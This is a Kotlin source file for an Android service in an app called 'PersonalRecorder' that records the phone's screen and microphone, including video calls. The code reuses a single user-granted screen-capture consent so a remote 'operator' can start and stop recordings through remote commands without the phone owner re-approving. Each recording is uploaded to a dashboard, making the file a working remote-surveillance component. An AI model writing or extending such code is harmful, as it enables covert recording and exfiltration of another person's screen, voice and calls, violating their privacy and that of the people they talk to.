package com.example.personalrecorder.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.content.res.Configuration
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import com.example.personalrecorder.R
import com.example.personalrecorder.net.CommandBus
import com.example.personalrecorder.net.MediaUploader
import com.example.personalrecorder.net.RealtimeClient
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlin.jvm.Volatile

/**
 * On-demand screen + microphone recording as a single MP4.
 *
 * Uses MediaRecorder with a SURFACE video source fed by a MediaProjection
 * virtual display, plus the device microphone (AAC audio track). This is the
 * same technique screen-recorder apps use and records everything that is
 * audible to and visible on the phone.
 *
 * This is also the "video call recording" path: while a video call
 * (WhatsApp, Instagram, Meet, ...) is on screen, a screen+mic recording
 * captures the call UI and the user's own voice. The far end of the call
 * cannot be captured on a stock Android — see the README "Limits" section.
 *
 * Session model: after the user grants the one-time screen-capture consent
 * (the system dialog), the service keeps the MediaProjection alive in a
 * "standby" state between recordings. That lets the operator start/stop
 * recordings remotely (record_start/stop, call_video_start/stop) without
 * asking the phone owner to re-approve the dialog for every call. The
 * notification's Stop action (or the UI toggle) fully releases the session.
 *
 * Controlled from the UI toggle, or remotely with
 * {"type":"record_start"} / {"type":"record_stop"} and
 * {"type":"call_video_start"} / {"type":"call_video_stop"}.
 */
class ScreenAudioRecorderService : Service() {

    companion object {
        const val ACTION_STOP = "action_stop"
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"
        const val CHANNEL_ID = "screen_audio_channel"
        const val VIDEO_BITRATE = 4_000_000
        const val VIDEO_FPS = 24
        const val AUDIO_BITRATE = 128_000
        const val AUDIO_SAMPLE_RATE = 44_100
        private const val NOTIFICATION_ID = 1004

        /** Category tag for call recordings (dashboard "Video calls" section). */
        const val CATEGORY_CALL_VIDEO = "call_video"

        @Volatile
        var isRunning = false
            private set

        /** Live instance while the service is up (used by remote command handlers). */
        @Volatile
        private var instance: ScreenAudioRecorderService? = null

        /**
         * Remote "call_video_start" handler (registered by ConnectionService,
         * which is long-lived). Starts a screen+mic recording tagged as a
         * video call if a consent-granted projection session is alive;
         * otherwise tells the dashboard the phone owner must tap Record once.
         */
        fun onRemoteCallVideoStart(context: Context) {
            val svc = instance
            if (svc != null && svc.hasActiveProjection) {
                svc.startCallRecording()
            } else {
                RealtimeClient.send(
                    "call_video_consent_needed",
                    JSONObject().put("reason", "screen_capture_consent_required")
                )
            }
        }

        /** Remote "call_video_stop" handler: stops the current recording (keeps session). */
        fun onRemoteCallVideoStop(context: Context) {
            instance?.stopRecording()
        }
    }

    private var projectionManager: MediaProjectionManager? = null
    private var projection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null
    private var currentFile: File? = null
    private var currentCategory: String = "video"

    val hasActiveProjection: Boolean
        get() = projection != null

    override fun onCreate() {
        super.onCreate()
        instance = this
        projectionManager = getSystemService(MediaProjectionManager::class.java)
        createNotificationChannel()
        CommandBus.register(CommandBus.CMD_REC_START) { startRecording() }
        CommandBus.register(CommandBus.CMD_REC_STOP) { stopRecording() }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) {
            fullStop()
            return START_NOT_STICKY
        }
        if (isRunning) return START_NOT_STICKY

        // MediaProjection consent extras (handed over by the UI after the
        // user-approved screen-capture dialog). A fresh consent replaces any
        // previous session's projection.
        @Suppress("DEPRECATION")
        val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, -1) ?: -1
        val resultData = if (Build.VERSION.SDK_INT >= 33) {
            intent?.getParcelableExtra(EXTRA_RESULT_DATA, Intent::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent?.getParcelableExtra(EXTRA_RESULT_DATA)
        }

        if (resultCode == -1 || resultData == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        teardownResources()
        val proj = projectionManager?.getMediaProjection(resultCode, resultData)
        if (proj == null) {
            RealtimeClient.send("recording_error", JSONObject().put("reason", "projection_unavailable"))
            stopSelf()
            return START_NOT_STICKY
        }
        projection = proj.apply {
            registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    // System revoked the projection (user swiped the capture
                    // indicator, etc.) — end the session completely.
                    stopRecording(standby = false)
                    teardownResources()
                    stopForeground(STOP_FOREGROUND_REMOVE)
                    stopSelf()
                }
            }, Handler(Looper.getMainLooper()))
        }

        startRecording()
        return START_STICKY
    }

    /** Starts a recording tagged as a video call (remote call_video_start). */
    fun startCallRecording() {
        currentCategory = CATEGORY_CALL_VIDEO
        startRecording()
    }

    private fun startRecording() {
        if (isRunning) return
        try {
            val metrics = resources.displayMetrics
            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi
            val portrait = resources.configuration.orientation == Configuration.ORIENTATION_PORTRAIT

            val dir = File(getExternalFilesDir(Environment.DIRECTORY_MOVIES), "screen")
                .apply { mkdirs() }
            currentFile = File(dir, "rec_${timestamp()}.mp4")

            val r = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(this) else MediaRecorder()
            r.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setAudioEncodingBitRate(AUDIO_BITRATE)
                setAudioSamplingRate(AUDIO_SAMPLE_RATE)
                setVideoEncodingBitRate(VIDEO_BITRATE)
                setVideoFrameRate(VIDEO_FPS)
                setVideoSize(width, height)
                // Keep the recording upright when the device is in portrait.
                if (portrait) setOrientationHint(90)
                setOutputFile(currentFile!!.absolutePath)
                prepare()
            }
            mediaRecorder = r

            // Surface must be fetched after prepare() and the virtual display
            // created before start().
            val surface = r.surface
            virtualDisplay = projection?.createVirtualDisplay(
                "personal_recorder_video",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                surface,
                null,
                // Non-null handler is required on API 34+
                Handler(Looper.getMainLooper())
            )
            if (virtualDisplay == null) {
                throw IllegalStateException("virtual_display_failed")
            }

            startInForeground()
            r.start()
            isRunning = true
            RealtimeClient.send(
                "recording_started",
                JSONObject()
                    .put("path", currentFile!!.absolutePath)
                    .put("resolution", "${width}x$height")
                    .put("portrait", portrait)
                    .put("category", currentCategory)
            )
        } catch (e: Exception) {
            RealtimeClient.send(
                "recording_error",
                JSONObject().put("reason", e.message ?: "start_failed")
            )
            teardownResources()
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
        }
    }

    /**
     * Stops the current recording, uploads it, and (by default) keeps the
     * projection session alive in standby so the next remote start needs no
     * new consent dialog.
     */
    private fun stopRecording(standby: Boolean = true) {
        if (!isRunning && mediaRecorder == null) return
        val r = mediaRecorder
        try {
            r?.stop()
        } catch (_: Exception) {
            // stop() throws if the recording ran < ~1s or received no frames;
            // the partial file is still kept.
        }
        try {
            r?.release()
        } catch (_: Exception) {}
        mediaRecorder = null
        isRunning = false
        val finished = currentFile
        RealtimeClient.send(
            "recording_stopped",
            JSONObject().put("path", finished?.absolutePath ?: "")
        )
        finished?.let { MediaUploader.upload(it, "video", currentCategory) }
        currentFile = null
        if (standby) {
            showStandbyNotification()
        } else {
            stopForeground(STOP_FOREGROUND_REMOVE)
        }
    }

    /** Ends the session completely: releases the projection and stops the service. */
    private fun fullStop() {
        stopRecording(standby = false)
        teardownResources()
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    private fun teardownResources() {
        virtualDisplay?.release()
        virtualDisplay = null
        try {
            projection?.stop()
        } catch (_: Exception) {}
        projection = null
    }

    private fun startInForeground() {
        val stopIntent = PendingIntent.getService(
            this, 0,
            Intent(this, ScreenAudioRecorderService::class.java).setAction(ACTION_STOP),
            PendingIntent.FLAG_IMMUTABLE
        )
        val notification = Notification.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setContentTitle("Recording screen + mic")
            .setContentText("PersonalRecorder is recording video and audio to MP4")
            .addAction(Notification.Action.Builder(null, "Stop", stopIntent).build())
            .build()
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    /** Standby state: session alive, nothing recording, projection kept. */
    private fun showStandbyNotification() {
        val stopIntent = PendingIntent.getService(
            this, 0,
            Intent(this, ScreenAudioRecorderService::class.java).setAction(ACTION_STOP),
            PendingIntent.FLAG_IMMUTABLE
        )
        val notification = Notification.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setContentTitle("Screen+mic session ready")
            .setContentText("Recording stopped — tap Stop to release the screen-capture session")
            .addAction(Notification.Action.Builder(null, "Stop", stopIntent).build())
            .build()
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID, "Screen + mic recording", NotificationManager.IMPORTANCE_LOW
        )
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
    }

    override fun onDestroy() {
        stopRecording(standby = false)
        teardownResources()
        CommandBus.unregister(CommandBus.CMD_REC_START)
        CommandBus.unregister(CommandBus.CMD_REC_STOP)
        instance = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun timestamp(): String =
        SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
}
